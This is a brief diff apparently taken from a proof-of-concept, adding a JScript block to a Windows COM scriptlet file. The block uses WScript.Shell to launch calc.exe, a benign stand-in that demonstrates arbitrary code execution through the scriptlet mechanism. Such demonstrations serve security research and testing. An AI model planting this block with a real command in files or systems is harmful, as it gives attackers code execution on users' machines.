@@ -15,4 +15,11 @@
 
 </script>
 </registration>
+<script language="JScript">
+
+	<![CDATA[
+	  new ActiveXObject("WScript.Shell").Run("calc.exe");
+	]]>
+
+</script>
 </scriptlet>
